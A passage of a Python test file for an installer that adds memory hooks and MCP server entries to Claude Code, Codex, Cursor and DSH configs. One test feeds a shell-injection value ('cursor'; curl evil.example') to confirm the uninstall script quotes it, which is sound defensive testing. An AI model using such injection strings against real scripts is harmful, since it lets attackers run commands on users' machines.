    config = json.loads((home / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert config["token"] == "octopoctop"
    assert "user" not in config  # 没给 user id 就不写
    assert "用本实例部署时配置的默认凭据" in result.stdout


def test_without_a_builtin_token_the_installer_still_demands_one(tmp_path) -> None:
    """没内置凭据 + 无 tty + 没给环境变量 → 明确报错，不盲读 stdin。"""
    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    env = {
        **os.environ,
        "HOME": str(home),
        "OCTOP_TERMINALS": "claude-code",
        "OCTOP_AGENT_ID": "AGT1",
    }
    env.pop("OCTOP_MEMORY_TOKEN", None)
    result = subprocess.run(
        ["sh", str(script)], env=env, capture_output=True, text=True, timeout=180
    )

    assert result.returncode != 0
    assert "缺少 token" in result.stderr
    assert "DEFAULT_TOKEN=" not in _script()  # 没内置值就不该有赋值


def test_codex_hooks_join_the_existing_config_without_clobbering_it(tmp_path) -> None:
    """~/.codex/config.toml 已有别人的 hook：只追加我们的，别的字段与信任状态原样保留。"""

    def prepare(home):
        (home / ".codex").mkdir(parents=True)
        config = home / ".codex/config.toml"
        (config).write_text(_CODEX_EXISTING.replace("CONFIG", str(config)), encoding="utf-8")

    home = _run_terminals(tmp_path, "codex", prepare)
    cfg = tomllib.loads((home / ".codex/config.toml").read_text(encoding="utf-8"))
    hooks = cfg["hooks"]

    def commands(event):
        return [entry["command"] for group in hooks[event] for entry in group.get("hooks", [])]

    assert cfg["model"] == "gpt-5"  # 其它字段不动
    assert len(commands("PreToolUse")) == 1 and "git-ai" in commands("PreToolUse")[0]
    assert len(commands("Stop")) == 2  # 别人的 + 我们的（跑了两遍也不重复）
    assert any("codex/stop-capture.sh" in command for command in commands("Stop"))
    assert len(commands("UserPromptSubmit")) == 1
    assert any("codex/user-prompt-recall.sh" in command for command in commands("UserPromptSubmit"))
    assert list(hooks["state"]) == [f"{home}/.codex/config.toml:stop:0:0"]  # 信任状态保留


def test_cursor_hooks_join_the_existing_json_without_clobbering_it(tmp_path) -> None:
    """~/.cursor/hooks.json 其它事件（如 git-ai 的 postToolUse）原样保留。"""

    def prepare(home):
        (home / ".cursor").mkdir(parents=True)
        (home / ".cursor/hooks.json").write_text(
            json.dumps(
                {"hooks": {"postToolUse": [{"command": "git-ai cursor"}]}, "version": 1}, indent=2
            )
            + "\n",
            encoding="utf-8",
        )

    home = _run_terminals(tmp_path, "cursor", prepare)
    cfg = json.loads((home / ".cursor/hooks.json").read_text(encoding="utf-8"))

    assert cfg["version"] == 1
    assert cfg["hooks"]["postToolUse"] == [{"command": "git-ai cursor"}]
    assert len(cfg["hooks"]["beforeSubmitPrompt"]) == 1  # 幂等：跑两遍仍只有一条
    assert (
        "cursor/hooks/cursor/user-prompt-recall.sh"
        in cfg["hooks"]["beforeSubmitPrompt"][0]["command"]
    )
    assert len(cfg["hooks"]["stop"]) == 1
    assert "cursor/hooks/cursor/stop-capture.sh" in cfg["hooks"]["stop"][0]["command"]


def test_uninstall_script_mentions_cursor_and_needs_no_token() -> None:
    script = render_uninstall_script()
    assert script.startswith("#!/bin/sh")
    assert "octop memory 卸载" in script
    assert "OCTOP_TERMINALS" in script
    assert "Cursor" in script
    assert "OCTOP_MEMORY_TOKEN" not in script
    assert "undo_cursor" in script or "CURSOR_DIR" in script


def test_uninstall_script_shell_quotes_terminals_query() -> None:
    """HTTP ``terminals`` must not break out of the shell assignment."""
    script = render_uninstall_script(terminals="cursor'; curl evil.example")
    assert "DEFAULT_TERMINALS='cursor'\"'\"'; curl evil.example'" in script
    assert "DEFAULT_TERMINALS='cursor'; curl evil.example'" not in script


def test_cursor_uninstall_removes_hooks_keeps_others(tmp_path) -> None:
    """setup → uninstall：octop hooks/目录清掉，别人的 hook 与无关 MCP 保留。"""

    def prepare(home):
        (home / ".cursor").mkdir(parents=True)
        (home / ".cursor/hooks.json").write_text(
            json.dumps(
                {"hooks": {"postToolUse": [{"command": "git-ai cursor"}]}, "version": 1},
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )
        (home / ".cursor/mcp.json").write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "octop-memory": {"url": "https://example/mcp"},
                        "other": {"url": "https://other"},
                    }
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )

    home = _run_terminals(tmp_path, "cursor", prepare)
    assert (home / ".cursor/hooks/cursor/stop-capture.mjs").exists()

    uninstall = tmp_path / "uninstall.sh"
    uninstall.write_text(render_uninstall_script(), encoding="utf-8")
    env = {
        **os.environ,
        "HOME": str(home),
        "OCTOP_TERMINALS": "cursor",
    }
    result = subprocess.run(
        ["sh", str(uninstall)], env=env, capture_output=True, text=True, timeout=60
    )
    assert result.returncode == 0, result.stdout + result.stderr

    cfg = json.loads((home / ".cursor/hooks.json").read_text(encoding="utf-8"))
    assert cfg["hooks"]["postToolUse"] == [{"command": "git-ai cursor"}]
    assert "beforeSubmitPrompt" not in cfg["hooks"]
    assert "stop" not in cfg["hooks"]
    assert not (home / ".cursor/hooks").exists()

    mcp = json.loads((home / ".cursor/mcp.json").read_text(encoding="utf-8"))
    assert "octop-memory" not in mcp["mcpServers"]
    assert mcp["mcpServers"]["other"]["url"] == "https://other"


def _run_claude_code_installer(tmp_path, claude_json: dict, settings: dict | None = None):
    """只装 Claude Code：沙箱 HOME + 预置的 .claude.json / settings.json。"""
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    (home / ".claude.json").write_text(json.dumps(claude_json, indent=2) + "\n", encoding="utf-8")
    if settings is not None:
        (home / ".claude/settings.json").write_text(
            json.dumps(settings, indent=2) + "\n", encoding="utf-8"
        )
    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "fake-token",
            "OCTOP_AGENT_ID": "AGT1",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    return home, result


def test_mcp_entry_is_added_when_no_octop_server_exists(tmp_path) -> None:
    home, _ = _run_claude_code_installer(
        tmp_path, {"mcpServers": {"other-mcp": {"type": "http", "url": "http://other/"}}}
    )
    servers = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"]
    assert "octop-memory-local" in servers  # 全新安装才新建条目
    assert "other-mcp" in servers  # 别人的条目原样保留


def test_mcp_entry_reuses_an_existing_octop_entry_with_the_same_endpoint(tmp_path) -> None:
    """已有同一个端点的 octop 服务（名字可能是 prod / oauth / 自定义）→ 复用，不新增条目。"""
    home, result = _run_claude_code_installer(
        tmp_path,
        {"mcpServers": {"octop-memory-prod": {"type": "http", "url": _URL}}},
    )
    servers = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"]
    assert list(servers) == ["octop-memory-prod"]
    assert "复用" in result.stdout


def test_mcp_entry_does_not_add_a_duplicate_for_a_different_octop_endpoint(tmp_path) -> None:
    """已有别的 octop 端点时保持原样：不按服务名硬塞第二个 octop 服务。"""
    home, result = _run_claude_code_installer(
        tmp_path,
        {
            "mcpServers": {
                "octop-memory-oauth": {"type": "http", "url": "https://oauth.example/mcp/"}
            }
        },
    )
    servers = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"]
    assert list(servers) == ["octop-memory-oauth"]
    assert "保持原样" in result.stdout


def test_legacy_mcp_tool_hook_under_another_server_name_is_replaced(tmp_path) -> None:
    """旧版 mcp_tool hook 的服务名可能是 octop-memory-prod：第 5 步按工具名清掉它。"""
    legacy = {
        "hooks": {
            "UserPromptSubmit": [
                {
                    "hooks": [
                        {
                            "type": "mcp_tool",
                            "server": "octop-memory-prod",
                            "tool": "memory_search",
                            "input": {"query": "${prompt}"},
                        }
                    ]
                }
            ]
        }
    }
    home, _ = _run_claude_code_installer(tmp_path, {"mcpServers": {}}, settings=legacy)
    entries = json.loads((home / ".claude/settings.json").read_text(encoding="utf-8"))["hooks"][
        "UserPromptSubmit"
    ]
    assert len(entries) == 1  # 旧 mcp_tool 那条被替换，只剩我们新写的
    assert entries[0]["type"] == "command"  # 简写形态：事件直接挂 handler
    assert not any(entry.get("type") == "mcp_tool" for entry in entries)


@posix_only
def test_dsh_bundle_is_auto_installed_when_the_dsh_cli_exists(tmp_path) -> None:
    """有 dsh CLI 时优先用它装：pnpm 加依赖 + 把 bundle 写进 profile 的 dsh.profile.bundles。

    DSH 只按 profile 的 bundle 名单加载 bundle，所以「装了依赖但没进名单」等于没装。
    """
    home = tmp_path / "home"
    profile = home / ".dsh/profiles/web"
    profile.mkdir(parents=True)
    (profile / "package.json").write_text(
        json.dumps(
            {"name": "profile-web", "dsh": {"profile": {"bundles": ["@deepseek-ai/dsh-base"]}}},
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    shim = fake_bin / "dsh"
    shim.write_text('#!/bin/sh\nprintf \'%s\\n\' "$@" >> "$0.args"\n', encoding="utf-8")
    shim.chmod(0o755)

    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    env = {
        **os.environ,
        "HOME": str(home),
        "PATH": f"{fake_bin}{os.pathsep}{os.environ['PATH']}",
        "OCTOP_TERMINALS": "dsh",
        "OCTOP_MEMORY_TOKEN": "fake-token",
        "OCTOP_AGENT_ID": "AGT1",
    }
    for _ in range(2):  # 第二次验证幂等
        result = subprocess.run(
            ["sh", str(script)], env=env, capture_output=True, text=True, timeout=180
        )
        assert result.returncode == 0, result.stdout + result.stderr

    bundle = home / ".dsh/bundles/dsh-memory-share"
    calls = (fake_bin / "dsh.args").read_text(encoding="utf-8")
    assert "plugin" in calls and "--profile" in calls and "web" in calls
    assert str(bundle) in calls
    assert not (fake_bin / "pnpm.args").exists()  # 有 dsh 就不必自己调 pnpm
    bundles = json.loads((profile / "package.json").read_text(encoding="utf-8"))["dsh"]["profile"][
        "bundles"
    ]
    assert bundles == ["@deepseek-ai/dsh-base", "octop-dsh-memory-share"]  # 已存在的不重复追加


@posix_only
def test_dsh_bundle_falls_back_to_pnpm_in_the_profile(tmp_path) -> None:
    """源码 checkout 往往没有 dsh 命令：退回在 profile 目录直接 pnpm add，再写 bundle 名单。"""
    home = tmp_path / "home"
    profile = home / ".dsh/profiles/web"
    profile.mkdir(parents=True)
    (profile / "package.json").write_text(
        json.dumps({"name": "profile-web", "dsh": {"profile": {"bundles": []}}}, indent=2) + "\n",
        encoding="utf-8",
    )
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    shim = fake_bin / "pnpm"
    shim.write_text(
        '#!/bin/sh\nprintf \'%s\\n\' "$PWD" >> "$0.cwd"\nprintf \'%s\\n\' "$@" >> "$0.args"\n',
        encoding="utf-8",
    )
    shim.chmod(0o755)

    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    # 保留 shell 自己要用的 /bin、/usr/bin 与解释器目录，但不含任何 dsh 命令
    path_dirs = [str(fake_bin), "/bin", "/usr/bin"]
    path_dirs += [
        str(Path(which).parent)
        for which in (shutil.which("python3"), shutil.which("node"))
        if which
    ]
    path = os.pathsep.join(dict.fromkeys(path_dirs))
    assert shutil.which("dsh", path=path) is None, "测试环境里 dsh 必须在 PATH 之外"
    env = {
        **os.environ,
        "HOME": str(home),
        "PATH": path,
        "OCTOP_TERMINALS": "dsh",
        "OCTOP_MEMORY_TOKEN": "fake-token",
        "OCTOP_AGENT_ID": "AGT1",
    }
    result = subprocess.run(
        ["sh", str(script)], env=env, capture_output=True, text=True, timeout=180
    )

    assert result.returncode == 0, result.stdout + result.stderr
    bundle = home / ".dsh/bundles/dsh-memory-share"
    assert (fake_bin / "pnpm.args").read_text(encoding="utf-8").splitlines() == [
        "add",
        str(bundle),
    ]
    assert (fake_bin / "pnpm.cwd").read_text(encoding="utf-8").strip() == str(profile)
    bundles = json.loads((profile / "package.json").read_text(encoding="utf-8"))["dsh"]["profile"][
        "bundles"
    ]
    assert bundles == ["octop-dsh-memory-share"]
    assert "已装进 profile「web」" in result.stdout
